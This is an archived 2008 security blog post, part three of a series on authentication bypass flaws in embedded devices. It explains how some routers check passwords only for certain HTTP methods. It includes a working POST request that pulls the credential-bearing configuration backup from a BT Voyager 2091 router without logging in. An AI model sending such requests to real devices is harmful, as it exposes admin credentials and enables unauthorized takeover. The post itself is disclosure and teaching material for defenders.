<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Holes In Embedded Devices Authentication Bypass (pt 3)</title><meta name="description" content="We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries here and here, before you continue."><meta property="name" content="Holes In Embedded Devices Authentication Bypass (pt 3)"><meta itemprop="name" content="Holes In Embedded Devices Authentication Bypass (pt 3)"><meta property="description" content="We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries here and here, before you continue."><meta itemprop="description" content="We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries here and here, before you continue."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-3%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-3%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-3/"><meta property="og:title" content="Holes In Embedded Devices Authentication Bypass (pt 3)"><meta property="og:description" content="We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries here and here, before you continue."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-3%2F?w=1024"><meta name="twitter:title" content="Holes In Embedded Devices Authentication Bypass (pt 3)"><meta name="twitter:description" content="We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries here and here, before you continue."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-authentication-bypass-pt-3%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Holes In Embedded Devices Authentication Bypass (pt 3)</h1><div class="date">Sat, 16 Feb 2008 08:08:17 GMT</div><div class="author">by
pagvac</div><div id="post-content"><p>We move on with the 3rd kind of authentication bypass bug. You may want to familiarize yourself with the previous two entries <a href="/blog/holes-in-embedded-devices-authentication-bypass-pt-1">here</a> and <a href="/blog/holes-in-embedded-devices-authentication-bypass-pt-2">here</a>, before you continue.</p>
<h2 id="unchecked-http-methods">Unchecked HTTP methods</h2>
<p>A device that is vulnerable to this issue, only performs an authentication check (i.e.: is the password being submitted with a request via basic authentication?) when the request is performed using a certain HTTP method. For instance, most devices have a feature to backup the config file which contains all the configuration settings including admin credentials. Let&#39;s say that when the admin user clicks on the &quot;backup configuration&quot; button, a GET request such as the following is submitted by the browser:</p>
<pre><code class="language-http"><span class="keyword">GET</span> <span class="string">/settings.cfg</span> HTTP/1.1
<span class="attribute">Host</span>: 192.168.1.1
<span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
<span class="attribute">Accept</span>: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
<span class="attribute">Accept-Language</span>: en-gb,en;q=0.5
<span class="attribute">Accept-Encoding</span>: gzip,deflate
<span class="attribute">Accept-Charset</span>: ISO-8859-1,utf-8;q=0.7,*;q=0.7
<span class="attribute">Connection</span>: Keep-Alive
<span class="attribute">Referer</span>: http://192.168.1.1/router-settings/
<span class="attribute">Authorization</span>: Basic YWRtaW46cGFzc3cwcmQ=</code></pre>
<p>However, the logic of the device is flawed and allows attackers to save the config file without a password by changing the HTTP method from GET to POST. This very same vulnerability is <a href="http://www.securityfocus.com/archive/1/440405">present</a> on the BT Voyager 2091 Wireless ADSL router which allows attackers to save the config file without providing username/password:</p>
<pre><code class="language-http"><span class="keyword">POST</span> <span class="string">/psiBackupInfo</span> HTTP/1.1
<span class="attribute">Host</span>: 192.168.1.1
<span class="attribute">Connection</span>: close
<span class="attribute">Content-Length</span>: 0</code></pre>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f36c605ac83086c5ef98ccccae1d7ac0?s=256&amp;d=retro" alt="Kayo"><span class="post-comment-author">Kayo</span><div class="post-comment-content">The honesty of your psoitng shines through</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2022 <a href=""></a>. All rights reserved.</p></footer></body></html>